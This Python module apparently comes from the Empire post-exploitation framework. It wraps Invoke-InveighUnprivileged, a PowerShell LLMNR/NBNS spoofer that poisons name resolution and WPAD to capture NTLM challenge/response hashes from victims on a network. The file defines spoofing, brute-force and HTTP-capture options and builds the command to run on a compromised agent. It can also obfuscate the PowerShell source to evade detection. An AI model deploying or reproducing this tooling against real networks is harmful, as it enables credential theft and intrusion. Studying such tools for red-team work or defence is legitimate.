import os.path
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-InveighUnprivileged',

            'Author': ['Kevin Robertson'],

            'Description': ('Inveigh Unprivileged is a Windows PowerShell LLMNR/NBNS spoofer with '
                            'challenge/response capture over HTTP. This version of Inveigh does not require local '
                            'admin access.'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/Kevin-Robertson/Inveigh'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SpooferIP' : {
                'Description'   :   'IP address for LLMNR/NBNS spoofer. This parameter is only necessary when redirecting victims to a system other than the Inveigh Brute Force host.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferHostsReply' : {
                'Description'   :   'Comma separated list of requested hostnames to respond to when spoofing with LLMNR and NBNS.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferHostsIgnore' : {
                'Description'   :   'Comma separated list of requested hostnames to ignore when spoofing with LLMNR and NBNS.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferIPsReply' : {
                'Description'   :   'Comma separated list of source IP addresses to respond to when spoofing with LLMNR and NBNS.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferIPsIgnore' : {
                'Description'   :   'Comma separated list of source IP addresses to ignore when spoofing with LLMNR and NBNS.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferRepeat' : {
                'Description'   :   'Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'LLMNR' : {
                'Description'   :   'Enable/Disable LLMNR spoofer (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'LLMNRTTL' : {
                'Description'   :   'Custom LLMNR TTL in seconds for the response packet.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'NBNS' : {
                'Description'   :   'Enable/Disable NBNS spoofer (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'NBNSTTL' : {
                'Description'   :   'Custom NBNS TTL in seconds for the response packet.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'NBNSBruteForce' : {
				'Description'   :   'Enable/Disable NBNS brute force spoofer (Y/N).',
                'Required'      :   False,
                'Value'         :   'N'
            },
            'NBNSBruteForceHost' : {
                'Description'   :   'Hostname to spoof with NBNS brute force spoofer.',
                'Required'      :   False,
                'Value'         :   'WPAD'
            },
            'NBNSBruteForcePause' : {
                'Description'   :   'Time in seconds the NBNS brute force spoofer will stop spoofing after an incoming HTTP request is received.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'NBNSBruteForceTarget' : {
                'Description'   :   'IP address target for NBNS brute force spoofer. This is required if NBNSBruteForce is enabled.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'HTTP' : {
                'Description'   :   'Enable/Disable HTTP challenge/response capture (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'HTTPIP' : {
                'Description'   :   'IP address for the HTTP listener.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'HTTPPort' : {
                'Description'   :   'TCP port for the HTTP listener.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'HTTPAuth' : {
                'Description'   :   'HTTP server authentication type. This setting does not apply to wpad.dat requests (Anonymous,Basic,NTLM).',
                'Required'      :   False,
                'Value'         :   'NTLM'
            },
            'HTTPBasicRealm' : {
                'Description'   :   'Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.',
                'Required'      :   False,
                'Value'         :   'IIS'
            },
            'HTTPResponse' : {
                'Description'   :   'String or HTML to serve as the default HTTP response. This response will not be used for wpad.dat requests. Do not wrap in quotes and use PowerShell character escapes where necessary.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADAuth' : {
                'Description'   :   'HTTP server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts (Anonymous,Basic,NTLM).',
                'Required'      :   False,
                'Value'         :   'NTLM'
            },
            'WPADEmptyFile' : {
                'Description'   :   'Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'WPADIP' : {
                'Description'   :   'Proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADPort.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADPort' : {
                'Description'   :   'Proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADIP.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADDirectHosts' : {
                'Description'   :   'Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the defined proxy. Add the Empire host to avoid catching Empire HTTP traffic.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Challenge' : {
                'Description'   :   'Specific 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'MachineAccounts' : {
                'Description'   :   'Enable/Disable showing NTLM challenge/response captures from machine accounts (Y/N).',
                'Required'      :   False,
                'Value'         :   'N'
            },
            'ConsoleStatus' : {
                'Description'   :   'Interval in minutes for auto-displaying all unique captured hashes and credentials. (Y/N)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ConsoleUnique' : {
                'Description'   :   'Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname, and username combinations.',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'RunCount' : {
                'Description'   :   'Number of captures to perform before auto-exiting.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'RunTime' : {
                'Description'   :   'Run time duration in minutes.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-InveighUnprivileged.ps1"
        if obfuscate:
            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/collection/Invoke-InveighUnprivileged.ps1"
            if not self.is_obfuscated():
                self.obfuscate(obfuscationCommand=obfuscationCommand)
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # set defaults for Empire
        script += "\n" + 'Invoke-InveighUnprivileged -Tool "2" '

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        if "," in str(values['Value']):
                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
                            script += " -" + str(option) + " " + quoted
                        else:
                            script += " -" + str(option) + " \"" + str(values['Value']) + "\""

        return script

    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
        if self.is_obfuscated() and not forceReobfuscation:
            return

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-InveighUnprivileged.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # obfuscate and write to obfuscated source path
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/collection/Invoke-InveighUnprivileged.ps1"
        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        try:
            f = open(obfuscatedSource, 'w')
        except:
            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
            return ""
        f.write(obfuscatedCode)
        f.close()

    def is_obfuscated(self):
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/collection/Invoke-InveighUnprivileged.ps1"
        return os.path.isfile(obfuscatedSource)
